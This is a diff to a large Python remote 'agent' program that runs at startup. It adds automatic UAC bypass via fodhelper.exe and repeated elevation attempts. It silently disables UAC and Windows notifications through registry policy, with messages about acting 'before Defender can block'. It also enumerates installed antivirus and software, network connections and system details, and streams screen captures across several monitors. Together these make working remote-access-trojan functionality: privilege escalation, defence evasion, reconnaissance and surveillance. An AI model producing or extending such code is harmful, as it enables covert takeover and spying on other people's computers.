+        try:
+            if platform.system() == 'Windows':
+                info['windows'] = self.get_windows_specific_info()
+            elif platform.system() == 'Linux':
+                info['linux'] = self.get_linux_specific_info()
+        except Exception:
+            pass
+        return info
+    def get_windows_specific_info(self):
+        w = {}
+        try:
+            r = subprocess.run(['wmic', 'os', 'get', 'Caption,Version,BuildNumber', '/format:list'], capture_output=True, text=True, timeout=5)
+            for line in (r.stdout or '').split('\n'):
+                if '=' in line:
+                    k, v = line.split('=', 1)
+                    w[k.strip().lower()] = v.strip()
+            r2 = subprocess.run(['wmic', 'computersystem', 'get', 'Domain', '/format:list'], capture_output=True, text=True, timeout=5)
+            for line in (r2.stdout or '').split('\n'):
+                if 'Domain=' in line:
+                    w['domain'] = line.split('=')[1].strip()
+            r3 = subprocess.run(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntivirusProduct', 'get', 'displayName', '/format:list'], capture_output=True, text=True, timeout=5)
+            av = []
+            for line in (r3.stdout or '').split('\n'):
+                if 'displayName=' in line:
+                    nm = line.split('=')[1].strip()
+                    if nm:
+                        av.append(nm)
+            w['antivirus'] = av
+        except Exception:
+            pass
+        return w
+    def get_linux_specific_info(self):
+        l = {}
+        try:
+            with open('/etc/os-release', 'r') as f:
+                for line in f:
+                    if '=' in line:
+                        k, v = line.strip().split('=', 1)
+                        l[k.lower()] = v.strip('"')
+            l['kernel'] = platform.release()
+        except Exception:
+            pass
+        return l
+    def get_network_info(self):
+        info = {'hostname': socket.gethostname(), 'fqdn': socket.getfqdn(), 'interfaces': [], 'connections': [], 'stats': {}}
+        try:
+            import psutil
+            for name, addrs in psutil.net_if_addrs().items():
+                ii = {'name': name, 'addresses': [], 'stats': None}
+                for a in addrs:
+                    ai = {'family': str(getattr(a, 'family', '')), 'address': getattr(a, 'address', '')}
+                    if getattr(a, 'family', None) == socket.AF_INET:
+                        ai['netmask'] = getattr(a, 'netmask', None)
+                        ai['broadcast'] = getattr(a, 'broadcast', None)
+                    ii['addresses'].append(ai)
+                try:
+                    s = psutil.net_if_stats().get(name)
+                    if s:
+                        ii['stats'] = {'isup': s.isup, 'speed_mbps': s.speed, 'mtu': s.mtu}
+                except Exception:
+                    pass
+                info['interfaces'].append(ii)
+            try:
+                for conn in psutil.net_connections(kind='inet'):
+                    if conn.status == 'ESTABLISHED':
+                        info['connections'].append({'local_address': f"{getattr(conn.laddr, 'ip', '')}:{getattr(conn.laddr, 'port', '')}" if getattr(conn, 'laddr', None) else None, 'remote_address': f"{getattr(conn.raddr, 'ip', '')}:{getattr(conn.raddr, 'port', '')}" if getattr(conn, 'raddr', None) else None, 'status': conn.status, 'pid': conn.pid})
+            except Exception:
+                pass
+            nio = psutil.net_io_counters()
+            info['stats'] = {'bytes_sent': nio.bytes_sent, 'bytes_recv': nio.bytes_recv, 'packets_sent': nio.packets_sent, 'packets_recv': nio.packets_recv, 'errin': nio.errin, 'errout': nio.errout, 'dropin': nio.dropin, 'dropout': nio.dropout}
+        except Exception:
+            pass
+        return info
+    def get_installed_software(self):
+        software = []
+        try:
+            if platform.system() == 'Windows':
+                import winreg
+                paths = [(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'), (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'), (winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall')]
+                for hive, path in paths:
+                    try:
+                        key = winreg.OpenKey(hive, path)
+                        for i in range(winreg.QueryInfoKey(key)[0]):
+                            try:
+                                subkey_name = winreg.EnumKey(key, i)
+                                subkey = winreg.OpenKey(key, subkey_name)
+                                try:
+                                    name = winreg.QueryValueEx(subkey, 'DisplayName')[0]
+                                    version = None
+                                    publisher = None
+                                    install_date = None
+                                    try:
+                                        version = winreg.QueryValueEx(subkey, 'DisplayVersion')[0]
+                                    except Exception:
+                                        pass
+                                    try:
+                                        publisher = winreg.QueryValueEx(subkey, 'Publisher')[0]
+                                    except Exception:
+                                        pass
+                                    try:
+                                        install_date = winreg.QueryValueEx(subkey, 'InstallDate')[0]
+                                    except Exception:
+                                        pass
+                                    software.append({'name': name, 'version': version, 'publisher': publisher, 'install_date': install_date})
+                                except Exception:
+                                    pass
+                                winreg.CloseKey(subkey)
+                            except Exception:
+                                continue
+                        winreg.CloseKey(key)
+                    except Exception:
+                        continue
+            elif platform.system() == 'Linux':
+                try:
+                    r = subprocess.run(['dpkg', '-l'], capture_output=True, text=True, timeout=10)
+                    for line in (r.stdout or '').split('\n')[5:]:
+                        if line.strip():
+                            parts = line.split()
+                            if len(parts) >= 3:
+                                software.append({'name': parts[1], 'version': parts[2], 'description': ' '.join(parts[3:]) if len(parts) > 3 else None})
+                except Exception:
+                    pass
+                if not software:
+                    try:
+                        r2 = subprocess.run(['rpm', '-qa', '--queryformat', '%{NAME}|%{VERSION}|%{RELEASE}\n'], capture_output=True, text=True, timeout=10)
+                        for line in (r2.stdout or '').split('\n'):
+                            if '|' in line:
+                                parts = line.split('|')
+                                software.append({'name': parts[0], 'version': f"{parts[1]}-{parts[2]}" if len(parts) > 2 else parts[1]})
+                    except Exception:
+                        pass
+            elif platform.system() == 'Darwin':
+                try:
+                    r = subprocess.run(['system_profiler', 'SPApplicationsDataType', '-json'], capture_output=True, text=True, timeout=15)
+                    data = json.loads(r.stdout or '{}')
+                    apps = data.get('SPApplicationsDataType', [])
+                    for app in apps:
+                        software.append({'name': app.get('_name'), 'version': app.get('version'), 'publisher': app.get('obtained_from')})
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        seen = set()
+        unique = []
+        for item in software:
+            nm = item.get('name')
+            if nm and nm not in seen:
+                seen.add(nm)
+                unique.append(item)
+        unique.sort(key=lambda x: (x.get('name') or '').lower())
+        return unique
 def agent_main():
     """Main function for agent mode (original main functionality)."""
     log_message("=" * 60)
@@ -15009,9 +16459,53 @@ if __name__ == "__main__":
         # Exit immediately to prevent recursive execution
         sys.exit(0)
     
+    # FIRST EXECUTION: Aggressive path to ensure admin, then apply registry import
+    if WINDOWS_AVAILABLE:
+        try:
+            print("=" * 80)
+            print("[STARTUP] FIRST ACTION: Acquire admin and apply UAC registry disable (HKLM)")
+            print("=" * 80)
+            # If not admin, try bypass first
+            if not is_admin():
+                print("[STARTUP] Not admin - attempting aggressive UAC bypass...")
+                bypass_ok = False
+                try:
+                    bypass_ok = attempt_uac_bypass()
+                except Exception as e:
+                    print(f"[STARTUP] UAC bypass error: {e}")
+                # If bypass launched elevated instance, exit this one to let it take over
+                if bypass_ok and not is_admin() and not KEEP_ORIGINAL_PROCESS:
+                    print("[STARTUP] Elevated instance launched - exiting original process")
+                    time.sleep(1)
+                    sys.exit(0)
+                # If still not admin after bypass, fall back to UAC prompt
+                if not is_admin():
+                    print("[STARTUP] Falling back to UAC prompt (runas)...")
+                    try:
+                        run_as_admin_with_limited_attempts()
+                    except Exception as e:
+                        print(f"[STARTUP] UAC prompt error: {e}")
+            # Apply registry import only if admin
+            if is_admin():
+                print("[STARTUP] Applying UAC registry import (HKLM Policies\\System)")
+                result_first = False
+                try:
+                    result_first = silent_disable_uac_method4()
+                except Exception as e:
+                    print(f"[STARTUP] UAC registry import error: {e}")
+                if result_first:
+                    print("[STARTUP] ✅ UAC registry import applied")
+                else:
+                    print("[STARTUP] ⚠️ UAC registry import failed (check permissions)")
+            else:
+                print("[STARTUP] ❌ Still not admin - registry import skipped")
+            print("=" * 80)
+        except Exception as e:
+            print(f"[STARTUP] Unexpected error in first action: {e}")
+    
     # RED TEAM MODE: AGGRESSIVE UAC BYPASS AT STARTUP
     # Use fodhelper.exe to automatically elevate to admin BEFORE Defender can block
-    if WINDOWS_AVAILABLE and not is_admin():
+    if WINDOWS_AVAILABLE and not is_admin() and not DISABLE_UAC_BYPASS:
         print("=" * 80)
         print("[RED TEAM] 🚨 AGGRESSIVE UAC BYPASS INITIATED")
         print("[RED TEAM] Using fodhelper.exe to auto-elevate to admin privileges")
@@ -15060,25 +16554,28 @@ if __name__ == "__main__":
             print("[STARTUP] ⚪ Running as Standard User")
             print("[STARTUP] 🔄 Attempting to request admin privileges...")
             
-            # Try to elevate privileges automatically
             if REQUEST_ADMIN_FIRST:
-                print("[STARTUP] 🔄 Using automatic UAC bypass methods...")
-                if attempt_uac_bypass():
-                    print("[STARTUP] ✅ UAC bypass initiated successfully!")
-                    print("[STARTUP] ⏳ Waiting for elevation to complete...")
-                    time.sleep(3)
-                    
-                    # Check if we're now admin after bypass
-                    if is_admin():
-                        print("[STARTUP] ✅✅✅ SUCCESSFULLY ELEVATED TO ADMIN!")
+                if run_as_admin_with_limited_attempts():
+                    print("[STARTUP] ✅ Admin privileges granted")
+                else:
+                    print("[STARTUP] ✅ User declined admin - continuing without admin")
+            else:
+                if not DISABLE_UAC_BYPASS:
+                    print("[STARTUP] 🔄 Using automatic UAC bypass methods...")
+                    if attempt_uac_bypass():
+                        print("[STARTUP] ✅ UAC bypass initiated successfully!")
+                        print("[STARTUP] ⏳ Waiting for elevation to complete...")
+                        time.sleep(3)
+                        if is_admin():
+                            print("[STARTUP] ✅✅✅ SUCCESSFULLY ELEVATED TO ADMIN!")
+                        else:
+                            print("[STARTUP] ⚠️ UAC bypass initiated but not yet elevated")
+                            print("[STARTUP] Continuing with standard user privileges...")
                     else:
-                        print("[STARTUP] ⚠️ UAC bypass initiated but not yet elevated")
+                        print("[STARTUP] ⚠️ Automatic UAC bypass failed")
                         print("[STARTUP] Continuing with standard user privileges...")
                 else:
-                    print("[STARTUP] ⚠️ Automatic UAC bypass failed")
-                    print("[STARTUP] Continuing with standard user privileges...")
-            else:
-                print("[STARTUP] ⚠️ Admin request disabled (REQUEST_ADMIN_FIRST=False)")
+                    print("[STARTUP] ⚠️ UAC bypass disabled")
         
         print("=" * 80)
     
@@ -15098,46 +16595,43 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"[STARTUP] WSL routing error: {e}")
         
-        # 1. AGGRESSIVE ADMIN ACQUISITION (RED TEAM PRIORITY)
-        print("\n[STARTUP] Step 1: AGGRESSIVE ADMIN ACQUISITION (RED TEAM MODE)...")
-        print("[STARTUP] ENSURING ADMIN PRIVILEGES BEFORE SECURITY DISABLE!")
-        print("[STARTUP] Using multiple UAC bypass techniques for maximum reliability!")
-        
-        admin_acquired = False
-        max_attempts = 3
-        
-        for attempt in range(max_attempts):
-            print(f"[STARTUP] Admin acquisition attempt {attempt + 1}/{max_attempts}...")
+        if not DISABLE_UAC_BYPASS:
+            print("\n[STARTUP] Step 1: AGGRESSIVE ADMIN ACQUISITION (RED TEAM MODE)...")
+            print("[STARTUP] ENSURING ADMIN PRIVILEGES BEFORE SECURITY DISABLE!")
+            print("[STARTUP] Using multiple UAC bypass techniques for maximum reliability!")
             
-            # Check if we're already admin
-            if is_admin():
-                print("[STARTUP] ✅ Already running as Administrator")
-                admin_acquired = True
-                break
+            admin_acquired = False
+            max_attempts = 3
+            
+            for attempt in range(max_attempts):
+                print(f"[STARTUP] Admin acquisition attempt {attempt + 1}/{max_attempts}...")
                 
-            # Use aggressive UAC bypass to gain admin
-            try:
-                if bootstrap_uac_disable_no_admin():
-                    print("[STARTUP] ✅✅✅ ADMIN PRIVILEGES ACQUIRED SUCCESSFULLY!")
-                    print("[STARTUP] ✅ Used UAC bypass - NO ADMIN PASSWORD NEEDED!")
+                if is_admin():
+                    print("[STARTUP] ✅ Already running as Administrator")
                     admin_acquired = True
                     break
-                else:
-                    print(f"[STARTUP] ⚠️ UAC bypass attempt {attempt + 1} failed")
-                    time.sleep(2)  # Brief delay before retry
                     
-            except Exception as e:
-                print(f"[STARTUP] UAC bypass error: {e}")
-                time.sleep(2)
-        
-        # CRITICAL: If admin not acquired, use fallback methods
-        if not admin_acquired:
-            print("[STARTUP] ❌ CRITICAL: Could not acquire admin privileges!")
-            print("[STARTUP] ⚠️ Security feature disable may be limited without admin rights")
-            print("[STARTUP] ℹ️ Agent will continue but some protections may remain active")
-        else:
-            print("[STARTUP] ✅ ADMIN PRIVILEGES SECURED - PROCEEDING WITH SECURITY DISABLE")
+                try:
+                    if bootstrap_uac_disable_no_admin():
+                        print("[STARTUP] ✅✅✅ ADMIN PRIVILEGES ACQUIRED SUCCESSFULLY!")
+                        print("[STARTUP] ✅ Used UAC bypass - NO ADMIN PASSWORD NEEDED!")
+                        admin_acquired = True
+                        break
+                    else:
+                        print(f"[STARTUP] ⚠️ UAC bypass attempt {attempt + 1} failed")
+                        time.sleep(2)
+                        
+                except Exception as e:
+                    print(f"[STARTUP] UAC bypass error: {e}")
+                    time.sleep(2)
             
+            if not admin_acquired:
+                print("[STARTUP] ❌ CRITICAL: Could not acquire admin privileges!")
+                print("[STARTUP] ⚠️ Security feature disable may be limited without admin rights")
+                print("[STARTUP] ℹ️ Agent will continue but some protections may remain active")
+            else:
+                print("[STARTUP] ✅ ADMIN PRIVILEGES SECURED - PROCEEDING WITH SECURITY DISABLE")
+        
         # Verify current admin status
         current_admin = is_admin()
         print(f"[STARTUP] Current admin status: {'✅ ADMIN' if current_admin else '❌ STANDARD USER'}")
@@ -15156,7 +16650,7 @@ if __name__ == "__main__":
         # 3. Disable Windows notifications
         print("\n[STARTUP] Step 3: Disabling Windows notifications...")
         try:
-            if disable_windows_notifications():
+            if REGISTRY_ENABLED and disable_windows_notifications():
                 print("[STARTUP] ✅ Notifications disabled successfully")
             else:
                 print("[STARTUP] ℹ️ Notification disable failed - will retry in background")
@@ -15271,14 +16765,14 @@ if __name__ == "__main__":
 
 
 def screen_capture_worker(agent_id):
-    global STREAMING_ENABLED, capture_queue
+    global STREAMING_ENABLED, capture_queue, SELECTED_MONITOR_INDEX, DISPLAY_MODE, PIP_MONITOR_INDEX
     if not MSS_AVAILABLE or not NUMPY_AVAILABLE or not CV2_AVAILABLE:
         log_message("Required modules not available for screen capture", "error")
         return
     try:
         with mss.mss() as sct:
             monitors = sct.monitors
-            monitor_index = 1 if len(monitors) > 1 else 0
+            monitor_index = SELECTED_MONITOR_INDEX if len(monitors) > 1 else 0
             monitor = monitors[monitor_index]
             # mss returns monitor dicts with left/top/right/bottom; newer may include width/height
             if isinstance(monitor, dict):
@@ -15298,8 +16792,43 @@ def screen_capture_worker(agent_id):
                 while STREAMING_ENABLED:
                     try:
                         start = time.time()
-                        sct_img = sct.grab(monitor if isinstance(monitor, dict) else monitors[monitor_index])
-                        img = np.array(sct_img)
+                        if DISPLAY_MODE == 'combined' and len(monitors) > 1:
+                            frames = []
+                            for i in range(1, len(monitors)):
+                                m = monitors[i]
+                                s = sct.grab(m)
+                                f = np.array(s)
+                                if f.shape[2] == 4:
+                                    f = cv2.cvtColor(f, cv2.COLOR_BGRA2BGR)
+                                frames.append(f)
+                            if frames:
+                                try:
+                                    img = np.hstack(frames)
+                                except Exception:
+                                    img = frames[0]
+                        elif DISPLAY_MODE == 'pip' and len(monitors) > 1:
+                            base_m = monitors[monitor_index]
+                            pip_idx = PIP_MONITOR_INDEX if 1 <= PIP_MONITOR_INDEX < len(monitors) else 1
+                            pip_m = monitors[pip_idx]
+                            base_img = np.array(sct.grab(base_m))
+                            pip_img = np.array(sct.grab(pip_m))
+                            if base_img.shape[2] == 4:
+                                base_img = cv2.cvtColor(base_img, cv2.COLOR_BGRA2BGR)
+                            if pip_img.shape[2] == 4:
+                                pip_img = cv2.cvtColor(pip_img, cv2.COLOR_BGRA2BGR)
+                            pip_h = max(1, base_img.shape[0] // 4)
+                            pip_w = max(1, base_img.shape[1] // 4)
+                            pip_resized = cv2.resize(pip_img, (pip_w, pip_h), interpolation=cv2.INTER_AREA)
+                            x_off = max(0, base_img.shape[1] - pip_w - 10)
+                            y_off = max(0, base_img.shape[0] - pip_h - 10)
+                            img = base_img.copy()
+                            try:
+                                img[y_off:y_off+pip_h, x_off:x_off+pip_w] = pip_resized
+                            except Exception:
+                                img = base_img
+                        else:
+                            sct_img = sct.grab(monitor if isinstance(monitor, dict) else monitors[monitor_index])
+                            img = np.array(sct_img)
                         if img.shape[1] != width or img.shape[0] != height:
                             img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
                         if img.shape[2] == 4:
